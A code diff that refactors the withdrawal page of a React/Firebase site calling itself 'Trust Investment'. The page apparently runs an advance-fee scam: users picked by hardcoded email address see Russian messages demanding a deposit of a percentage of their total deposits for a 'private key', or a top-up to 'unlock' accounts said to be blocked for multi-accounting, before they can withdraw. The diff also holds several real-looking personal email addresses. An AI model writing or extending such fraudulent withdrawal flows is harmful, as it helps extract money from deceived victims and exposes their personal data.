@@ -11,7 +11,6 @@ import { ConfirmedWindow } from "../../components/ConfirmedWindow/ConfirmedWindo
 import { addDoc, collection, doc, updateDoc } from "firebase/firestore";
 import { FirebaseContext } from "../../index";
 import { useOutletContext } from "react-router-dom";
-import { getAuth } from "firebase/auth";
 import { useTranslation } from "react-i18next";
 import { Steps } from "antd";
 import WithdrawnImage from "assets/images/withdrawn.svg";
@@ -24,9 +23,10 @@ import IDIcon from "assets/images/withdrawn-icons/id.svg";
 import DateIcon from "assets/images/withdrawn-icons/date.svg";
 import { Waves } from "../../components/Waves/Waves";
 import Wallets from "../../components/Wallets/Wallets";
-import Input from "antd/lib/input";
-import notification from "antd/lib/notification";
 import { NadezhdaPrivateKey } from "./NadezhdaPrivateKey";
+import PrivateKeyNotification from "./PrivateKeyNotification";
+import PrivateKeyWarning from "./PrivateKeyWarning";
+import PrivateKeyErnesto from "./PrivateKeyErnesto";
 
 const Withdraw = () => {
   const [amount, setAmount] = useState(0);
@@ -36,13 +36,10 @@ const Withdraw = () => {
   const [form] = Form.useForm();
   const { firestore } = useContext(FirebaseContext);
   const { userData } = useOutletContext();
-  const auth = getAuth();
   const { t, i18n } = useTranslation();
   const [current, setCurrent] = useState(0);
-  const [api, contextHolder] = notification.useNotification();
 
   const [isPrivatKeyShowed, setIsPrivatKeyShowed] = useState(false);
-  const [privatKey, setPrivatKey] = useState(false);
 
   const [walletIsExist, setWalletIsExist] = useState(false);
 
@@ -52,11 +49,6 @@ const Withdraw = () => {
   useEffect(() => {
     const isErnest = userData.email === "azrv1@mail.ru";
 
-    const userWithPrivateKey =
-      userData.email === "gevond@mail.ru" ||
-      userData.email === "stassy95@mail.ru" ||
-      userData.email === "vova.grigoryants@list.ru";
-
     if (isErnest) {
       setPrivatKeyAmount(1000);
       setPrivatKeyPercentage(43);
@@ -64,21 +56,7 @@ const Withdraw = () => {
     } else {
       setIsPrivatKeyShowed(false);
     }
-
-    if (userWithPrivateKey) {
-      setPrivatKey(true);
-      setIsPrivatKeyShowed(false);
-    } else {
-      setPrivatKey(false);
-    }
   }, [amount]);
-
-  const openNotification = () => {
-    api.error({
-      message: "",
-      description: "Пополните счёт!",
-    });
-  };
 
   const handleConfirmedOk = () => {
     setIsConfirmedModalOpen(false);
@@ -97,7 +75,7 @@ const Withdraw = () => {
   };
 
   const next = () => {
-    form.validateFields().then((values) => setCurrent(current + 1));
+    form.validateFields().then(() => setCurrent(current + 1));
   };
   const prev = () => {
     setCurrent(current - 1);
@@ -128,99 +106,16 @@ const Withdraw = () => {
       title: t("cash_in.confirm"),
       content: (
         <>
-          {userData.isPrivateKeyWarning ? (
-            <div className={styles["private-key-warning"]}>
-              <p>
-                Недавно было обнаружено, что с вашего IP-адреса активно используются несколько аккаунтов которые активно
-                злоупотребляют нашей реферальной программой. Это противоречит нашим условиям использования, которые
-                строго запрещают мультиаккаунтинг и злоупотребление реферальной программой.
-              </p>
-              <p>
-                В связи с этим, мы вынуждены были заблокировать все связанные аккаунты. Пожалуйста, не создавайте новые
-                аккаунты и не злоупотребляйте нашими услугами, чтобы избежать дальнейших санкций.
-              </p>
-              <p>
-                Для разблокировки аккаунтов в реферальной цепочке нужно пополнить личные кабинеты на сумму наибольшего
-                депозита по ограниченным кабинетам.
-              </p>
-            </div>
-          ) : (
-            ""
-          )}
-          {privatKey || userData.isPrivateKey ? (
-            <>
-              <div className={styles["private-key-wrapper"]}>
-                <p>
-                  <span>Важно:</span> Вы собираетесь ввести ваш приватный финансовый ключ. Этот ключ представляет собой
-                  уникальную комбинацию символов, которая предоставляет вам доступ к вашим личным финансовым данным.
-                </p>
-                <p>
-                  Будьте осторожны при использовании вашего приватного ключа. Не раскрывайте его третьим лицам, не
-                  сохраняйте на общедоступных или незащищенных устройствах. В случае его утери или кражи, ваши
-                  финансовые средства могут быть поставлены под угрозу.
-                </p>
-                <p>
-                  Пожалуйста, убедитесь, что вы находитесь в безопасном и приватном окружении перед тем, как ввести свой
-                  приватный ключ. Если вы не уверены, что ваше окружение безопасно, отложите этот процесс на более
-                  подходящее время.
-                </p>
-                <p>
-                  Вводите ваш ключ только если вы абсолютно уверены в своих действиях. Помните, что ответственность за
-                  сохранность вашего приватного ключа лежит на вас.
-                </p>
-                <p>Пожалуйста, введите ваш приватный финансовый ключ в поле ниже:</p>
-                <Form.Item
-                  name={"private-key"}
-                  rules={[
-                    {
-                      required: true,
-                      message: "Требуется приватный финансовый ключ",
-                    },
-                  ]}
-                >
-                  <Input />
-                </Form.Item>
-              </div>
-            </>
-          ) : (
-            ""
-          )}
+          {userData.isPrivateKeyWarning ? <PrivateKeyWarning /> : ""}
+          {userData.isPrivateKey ? <PrivateKeyNotification /> : ""}
 
           {isPrivatKeyShowed ? (
-            <div className={styles["disclaimer"]}>
-              <p>
-                Уважаемый <span className={styles["nickname"]}>{userData.nickname}</span>,
-              </p>
-              <p>
-                Мы хотели бы напомнить вам о важности безопасности вашего аккаунта при использовании нашей платформы.
-                Если вы планируете вывести со своего счета сумму свыше <span>{privatKeyAmount}$</span>, вам необходимо
-                использовать приватный ключ для подтверждения транзакции.
-              </p>
-              <p>
-                Приватный ключ - это уникальный и секретный код, который используется для подписи транзакций и
-                подтверждения вашей личности. Для получения приватного ключа нужно пополнить кабинет на{" "}
-                <span>{privatKeyPercentage}%</span> от суммы всех депозитов. Приобретение приватного ключа -{" "}
-                <span>бесплатно.</span> Средства можно будет вывести сразу, после того как они будут зачислены на ваш
-                счет. Все функции вашего личного кабинета, в том числе, все внесенные средства, будут доступны сразу же
-                после ввода приватного финансового ключа.
-              </p>
-              <p>Пожалуйста, убедитесь, что ваш приватный ключ надежно защищен и не передается третьим лицам.</p>
-              <div>
-                <Input className={styles["private-key"]} value={"***********"} disabled />{" "}
-                <Button onClick={openNotification}>Получить</Button>
-              </div>
-
-              <p>
-                Мы призываем вас принять меры для обеспечения безопасности вашего аккаунта и соблюдения наших политик
-                безопасности.
-              </p>
-              <p>С уважением, Команда Trust Investment.</p>
-            </div>
+            <PrivateKeyErnesto nickname={userData.nickname} amount={privatKeyAmount} percentage={privatKeyPercentage} />
           ) : (
             ""
           )}
           <ul className={styles["information-list"]}>
-            <img src={WithdrawnImage} width={300} />
+            <img src={WithdrawnImage} width={300} alt={""} />
             <li>
               <p>
                 <img src={PaymentMethodIcon} width={20} alt={""} />
@@ -307,12 +202,12 @@ const Withdraw = () => {
 
     form.validateFields().then(async (values) => {
       await addDoc(collection(firestore, "transactions"), {
-        account_id: auth.currentUser.uid,
+        account_id: userData.uid,
         amount: +form.getFieldValue("amount") + tax,
         status: "Ожидание",
         type: "Вывод",
         date: new Date(),
-        email: auth.currentUser.email,
+        email: userData.email,
         executor: form.getFieldValue("payment-method"),
         paymentMethod: form.getFieldValue("payment-method"),
         tax: tax,
@@ -397,7 +292,6 @@ const Withdraw = () => {
       >
         <ConfirmedWindow transactionID={getRandomArbitrary()} />
       </Modal>
-      <>{contextHolder}</>
     </div>
   );
 };
